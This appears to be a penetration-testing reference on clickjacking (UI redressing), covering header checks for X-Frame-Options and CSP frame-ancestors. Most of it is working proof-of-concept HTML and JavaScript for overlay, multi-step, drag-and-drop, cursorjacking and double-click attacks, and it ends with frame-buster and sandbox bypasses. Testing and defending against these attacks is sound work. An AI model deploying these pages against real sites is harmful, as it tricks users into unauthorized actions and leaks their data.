<clickjacking_guide>
<title>CLICKJACKING / UI REDRESSING</title>

<critical>Clickjacking attacks trick users into clicking hidden elements by overlaying transparent iframes or repositioning UI elements. This can lead to unauthorized actions, permission grants, and data theft. Modern browser protections (X-Frame-Options, CSP frame-ancestors) mitigate basic attacks, but sophisticated techniques and misconfigurations continue to enable exploitation.</critical>

<scope>
- Classic iframe overlay attacks
- Cursorjacking (cursor position manipulation)
- Likejacking (social media exploitation)
- Drag-and-drop attacks (data exfiltration)
- Touch-based clickjacking (mobile)
- Double-click exploitation
- Scroll-based attacks
</scope>

<methodology>
1. Check for X-Frame-Options and CSP frame-ancestors headers.
2. Test if target page can be embedded in iframes.
3. Identify sensitive clickable actions (like buttons, form submissions).
4. Create proof-of-concept pages demonstrating click hijacking.
5. Test for partial protections and bypass techniques.
</methodology>

<detection>
<header_analysis>
{% raw %}
# Check response headers
# Missing or weak headers indicate vulnerability

# X-Frame-Options values:
X-Frame-Options: DENY                    # Blocks all framing
X-Frame-Options: SAMEORIGIN              # Allows same-origin only
X-Frame-Options: ALLOW-FROM https://...  # Deprecated, limited support

# CSP frame-ancestors:
Content-Security-Policy: frame-ancestors 'none'       # Blocks all framing
Content-Security-Policy: frame-ancestors 'self'       # Same-origin only
Content-Security-Policy: frame-ancestors https://...  # Specific origins

# Vulnerability indicators:
- No X-Frame-Options header
- No CSP frame-ancestors directive
- ALLOW-FROM with broad or attacker-controllable origins
- Misconfigured wildcards in frame-ancestors
{% endraw %}
</header_analysis>

<automated_testing>
{% raw %}
# JavaScript iframe test
function testClickjacking(url) {
    const iframe = document.createElement('iframe');
    iframe.src = url;
    iframe.style.opacity = '0.5';
    iframe.style.position = 'absolute';
    
    iframe.onload = function() {
        console.log('Page can be framed - potentially vulnerable');
    };
    
    iframe.onerror = function() {
        console.log('Framing blocked by browser');
    };
    
    document.body.appendChild(iframe);
}
{% endraw %}
</automated_testing>
</detection>

<attack_techniques>
<basic_clickjacking>
{% raw %}
<!DOCTYPE html>
<html>
<head>
    <title>Clickjacking PoC</title>
    <style>
        iframe {
            width: 800px;
            height: 600px;
            position: absolute;
            top: 0;
            left: 0;
            opacity: 0.0001;  /* Nearly invisible */
            z-index: 2;
        }
        .decoy {
            position: absolute;
            top: 100px;  /* Aligned with target button */
            left: 200px;
            z-index: 1;
        }
    </style>
</head>
<body>
    <h1>Click the button to win a prize!</h1>
    <button class="decoy">CLAIM PRIZE</button>
    <iframe src="https://target.com/sensitive-action"></iframe>
</body>
</html>
{% endraw %}
</basic_clickjacking>

<multi_step_clickjacking>
{% raw %}
<!DOCTYPE html>
<html>
<head>
    <style>
        #step1, #step2, #step3 { display: none; position: absolute; }
        #step1.active, #step2.active, #step3.active { display: block; }
        iframe { opacity: 0.0001; position: absolute; z-index: 10; }
    </style>
</head>
<body>
    <div id="step1" class="active">
        <h2>Step 1: Click Start</h2>
        <button onclick="nextStep(2)">Start Game</button>
        <iframe src="https://target.com/enable-feature"></iframe>
    </div>
    <div id="step2">
        <h2>Step 2: Click Continue</h2>
        <button onclick="nextStep(3)">Continue</button>
        <iframe src="https://target.com/confirm-action"></iframe>
    </div>
    <div id="step3">
        <h2>Step 3: Claim Prize</h2>
        <button>Get Prize</button>
        <iframe src="https://target.com/execute-action"></iframe>
    </div>
    <script>
        function nextStep(step) {
            document.querySelectorAll('[id^=step]').forEach(el => el.classList.remove('active'));
            document.getElementById('step' + step).classList.add('active');
        }
    </script>
</body>
</html>
{% endraw %}
</multi_step_clickjacking>

<drag_drop_attack>
{% raw %}
<!DOCTYPE html>
<html>
<head>
    <style>
        #drag-source {
            width: 100px; height: 100px;
            background: gold;
            cursor: move;
        }
        #hidden-iframe {
            position: absolute;
            opacity: 0.0001;
            pointer-events: none;
        }
        #drop-target {
            width: 200px; height: 200px;
            border: 2px dashed gray;
            position: relative;
        }
    </style>
</head>
<body>
    <h1>Drag the gold box to the target!</h1>
    <div id="drag-source" draggable="true">DRAG ME</div>
    <div id="drop-target">
        <iframe id="hidden-iframe" src="https://target.com/upload"></iframe>
        DROP HERE
    </div>
    <script>
        // Drag-drop clickjacking can exfiltrate selected text or files
        document.getElementById('drag-source').addEventListener('dragstart', function(e) {
            e.dataTransfer.setData('text/plain', document.getSelection().toString());
        });
    </script>
</body>
</html>
{% endraw %}
</drag_drop_attack>

<cursorjacking>
{% raw %}
<!DOCTYPE html>
<html>
<head>
    <style>
        body {
            cursor: none;  /* Hide real cursor */
        }
        #fake-cursor {
            position: fixed;
            width: 20px;
            height: 20px;
            background: url('cursor.png');
            pointer-events: none;
            z-index: 9999;
        }
    </style>
</head>
<body>
    <div id="fake-cursor"></div>
    <p>Move your mouse and click the button</p>
    <button style="position: absolute; left: 200px;">Safe Button</button>
    <button style="position: absolute; left: 500px; opacity: 0.0001;">Dangerous Action</button>
    
    <script>
        // Offset fake cursor from real position
        document.addEventListener('mousemove', function(e) {
            document.getElementById('fake-cursor').style.left = (e.clientX - 300) + 'px';
            document.getElementById('fake-cursor').style.top = e.clientY + 'px';
        });
    </script>
</body>
</html>
{% endraw %}
</cursorjacking>

<double_click_attack>
{% raw %}
<!DOCTYPE html>
<html>
<head>
    <style>
        #overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 10; }
        iframe { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 5; opacity: 0.0001; }
    </style>
</head>
<body>
    <div id="overlay">
        <h1>Double-click anywhere to continue!</h1>
    </div>
    <iframe src="https://target.com/dangerous-action"></iframe>
    
    <script>
        // First click removes overlay, second click hits iframe
        document.getElementById('overlay').addEventListener('click', function() {
            this.style.display = 'none';
        });
    </script>
</body>
</html>
{% endraw %}
</double_click_attack>
</attack_techniques>

<bypass_techniques>
<sandbox_bypass>
{% raw %}
# sandbox attribute without allow-scripts
<iframe sandbox="allow-forms" src="https://target.com/action">
# Forms still work, may bypass some protections

# sandbox with allow-top-navigation
<iframe sandbox="allow-scripts allow-top-navigation" src="...">
# Can redirect parent window
{% endraw %}
</sandbox_bypass>

<frame_buster_bypass>
{% raw %}
# Bypass JavaScript frame busters

# Using sandbox (blocks scripts)
<iframe sandbox src="https://target.com">

# Using srcdoc to modify content
<iframe srcdoc="<script>window.top = window.self;</script>...">

# Blocking beforeunload
<script>
window.onbeforeunload = function() { return false; };
</script>
<iframe src="https://target.com">

# Double framing
<iframe src="https://attacker.com/frame.html">
  <!-- frame.html contains -->
  <iframe src="https://target.com">
</iframe>
{% endraw %}
</frame_buster_bypass>

